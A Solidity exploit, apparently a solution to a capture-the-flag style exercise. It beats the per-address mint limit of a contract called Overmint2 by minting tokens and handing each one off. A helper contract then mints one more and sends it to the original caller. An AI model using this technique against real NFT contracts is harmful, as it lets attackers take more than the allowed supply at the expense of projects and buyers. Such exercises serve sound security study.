// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./Overmint2.sol";

contract Minion {
    Overmint2 public overmint2;

    constructor(address _overmint2Address) {
        overmint2 = Overmint2(_overmint2Address);
    }

    function attack() public {
        overmint2.mint();
        overmint2.transferFrom(address(this), tx.origin, 5);
    }
}

contract Overmint2Attacker {
    Overmint2 public overmint2;

    constructor(address _overmint2Address) {
        overmint2 = Overmint2(_overmint2Address);
        Minion minion = new Minion(_overmint2Address);

        for (uint256 i; i < 4; i++) {
            overmint2.mint();
        }

        for (uint256 i = 1; i < 5; i++) {
            overmint2.transferFrom(address(this), msg.sender, i);
        }

        minion.attack();
    }
}
